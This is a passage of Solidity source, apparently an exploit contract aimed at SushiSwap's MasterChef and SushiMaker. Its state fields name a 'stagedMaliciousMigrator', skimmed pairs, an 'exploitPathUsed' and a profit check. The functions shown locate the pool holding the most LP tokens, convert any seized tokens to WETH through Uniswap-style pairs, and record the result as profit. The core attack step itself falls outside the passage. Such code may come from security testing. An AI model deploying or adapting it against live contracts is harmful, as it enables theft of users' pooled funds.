                if (counterpart != WETH) {
                    uint256 wethOut = _swapUsingFactory(factory, counterpart, WETH, bridgeOut);
                    if (wethOut == 0 && counterpart != SUSHI) {
                        uint256 sushiOut = _swapUsingFactory(factory, counterpart, SUSHI, bridgeOut);
                        if (sushiOut != 0) {
                            _swapUsingFactory(factory, SUSHI, WETH, sushiOut);
                        }
                    }
                }
                return;
            }
        }

        if (tokenIn != SUSHI) {
            uint256 sushiOut = _swapUsingFactory(factory, tokenIn, SUSHI, amountIn);
            if (sushiOut != 0) {
                _swapUsingFactory(factory, SUSHI, WETH, sushiOut);
            }
        }
    }

    function _flushDirectToWeth(address factory, address token) internal {
        if (token == address(0) || token == WETH) {
            return;
        }
        uint256 amount = _safeBalanceOf(token, address(this));
        if (amount == 0) {
            return;
        }
        uint256 directOut = _swapUsingFactory(factory, token, WETH, amount);
        if (directOut == 0 && token != SUSHI) {
            uint256 sushiOut = _swapUsingFactory(factory, token, SUSHI, amount);
            if (sushiOut != 0) {
                _swapUsingFactory(factory, SUSHI, WETH, sushiOut);
            }
        }
    }

    function _swapUsingFactory(address factory, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (uint256 amountOut)
    {
        if (amountIn == 0 || tokenIn == tokenOut) {
            return 0;
        }

        address pair;
        try IUniswapV2FactoryLike(factory).getPair(tokenIn, tokenOut) returns (address pair_) {
            pair = pair_;
        } catch {
            return 0;
        }

        if (pair == address(0) || pair.code.length == 0) {
            return 0;
        }
        return _swapUsingSpecificPair(pair, tokenIn, tokenOut, amountIn);
    }

    function _swapUsingSpecificPair(address pair, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (uint256 amountOut)
    {
        if (amountIn == 0 || pair.code.length == 0) {
            return 0;
        }

        address pairToken0;
        address pairToken1;
        try IUniswapV2PairLike(pair).token0() returns (address token0_) {
            pairToken0 = token0_;
        } catch {
            return 0;
        }
        try IUniswapV2PairLike(pair).token1() returns (address token1_) {
            pairToken1 = token1_;
        } catch {
            return 0;
        }

        if (!((pairToken0 == tokenIn && pairToken1 == tokenOut) || (pairToken0 == tokenOut && pairToken1 == tokenIn))) {
            return 0;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        uint256 reserveIn;
        uint256 reserveOut;
        bool zeroForOne;
        if (pairToken0 == tokenIn) {
            reserveIn = reserve0;
            reserveOut = reserve1;
            zeroForOne = true;
        } else {
            reserveIn = reserve1;
            reserveOut = reserve0;
            zeroForOne = false;
        }
        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        if (amountOut == 0) {
            return 0;
        }

        uint256 beforeOut = _safeBalanceOf(tokenOut, address(this));
        if (!_safeTransfer(tokenIn, pair, amountIn)) {
            return 0;
        }

        try IUniswapV2PairLike(pair).swap(zeroForOne ? 0 : amountOut, zeroForOne ? amountOut : 0, address(this), "") {
            amountOut = _safeBalanceOf(tokenOut, address(this)) - beforeOut;
        } catch {
            amountOut = 0;
        }
    }

    function _snapshotPoolState(address chefAddress) internal {
        uint256 poolLength = observedPoolLength;
        if (poolLength == 0) {
            return;
        }

        uint256 scanLimit = poolLength > 8 ? 8 : poolLength;
        for (uint256 pid = 0; pid < scanLimit; ++pid) {
            try IMasterChefLike(chefAddress).poolInfo(pid) returns (address lpToken, uint256, uint256, uint256) {
                uint256 lpBalance = _safeBalanceOf(lpToken, chefAddress);
                if (lpBalance != 0 || observedPoolLpToken == address(0)) {
                    observedPid = pid;
                    observedPoolLpToken = lpToken;
                    observedTargetLpBalance = lpBalance;
                    if (lpBalance != 0) {
                        break;
                    }
                }
            } catch {}
        }
    }

    function _settleProfit() internal {
        _profitAmount = _safeBalanceOf(WETH, address(this));
        _hypothesisValidated = _profitAmount != 0;
    }

    function _readOwner(address account) internal view returns (address owner_) {
        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(IOwnableLike.owner.selector));
        if (success && data.length >= 32) {
            owner_ = abi.decode(data, (address));
        }
    }

    function _readFactory(address account) internal view returns (address factory_) {
        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(ISushiMakerLike.factory.selector));
        if (success && data.length >= 32) {
            factory_ = abi.decode(data, (address));
        }
    }

    function _tryReadAddress(address account, bytes memory callData) internal view returns (bool ok, address value) {
        (bool success, bytes memory data) = account.staticcall(callData);
        if (!success || data.length < 32) {
            return (false, address(0));
        }
        return (true, abi.decode(data, (address)));
    }

    function _tryReadUint(address account, bytes memory callData) internal view returns (bool ok, uint256 value) {
        (bool success, bytes memory data) = account.staticcall(callData);
        if (!success || data.length < 32) {
            return (false, 0);
        }
        return (true, abi.decode(data, (uint256)));
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256 amountOut)
    {
        uint256 amountInWithFee = amountIn * 997;
        amountOut = (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool ok) {
        if (amount == 0) {
            return true;
        }
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        ok = success && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _resetState() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        _hypothesisValidated = false;

        checkedTarget = false;
        targetHasCode = false;
        targetExposesMigratorFlow = false;
        ownerStageReachable = false;
        observedOwner = address(0);
        observedFactory = address(0);
        observedPoolLength = 0;
        observedMigrator = address(0);
        observedPoolLpToken = address(0);
        observedTargetLpBalance = 0;
        observedPid = 0;
        stagedMaliciousMigrator = address(0);
        scannedPairs = 0;
        skimmedPairs = 0;
        exploitPathUsed = "none";
        infeasibilityReason = "";
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
        if (token.code.length == 0) {
            return 0;
        }

        (bool success, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!success || data.length < 32) {
            return 0;
        }

        balance = abi.decode(data, (uint256));
    }
